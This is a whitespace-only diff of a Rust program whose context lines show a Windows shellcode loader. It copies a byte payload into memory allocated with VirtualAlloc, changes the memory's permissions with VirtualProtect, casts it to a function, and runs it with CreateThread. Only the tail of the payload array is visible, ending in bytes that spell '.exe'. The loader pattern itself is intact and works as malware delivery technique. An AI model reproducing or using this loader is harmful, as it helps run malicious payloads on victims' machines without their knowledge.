@@ -37,7 +37,7 @@ fn main() {
         0x2e,0x65,0x78,0x65,0x00];
 
 
-        let payload_addr = 
+        let payload_addr =
         VirtualAlloc(
             0 as *const c_void,
             payload.len(),
@@ -47,7 +47,7 @@ fn main() {
 
         //copy payload
         std::ptr::copy(payload.as_ptr() as _, payload_addr, payload.len());
-        
+
         //change payload permissions
         VirtualProtect(
             (payload_addr) as *const c_void,
@@ -58,15 +58,15 @@ fn main() {
 
         let payload_fn = std::mem::transmute (payload_addr as *const u32);
 
-        let thread = 
+        let thread =
         CreateThread(
           null_mut(),
           0,
-          payload_fn, 
-          null_mut(), 
-          0, 
+          payload_fn,
+          null_mut(),
+          0,
           null_mut());
-        
+
         WaitForSingleObject(thread, u32::MAX);
     }
 }
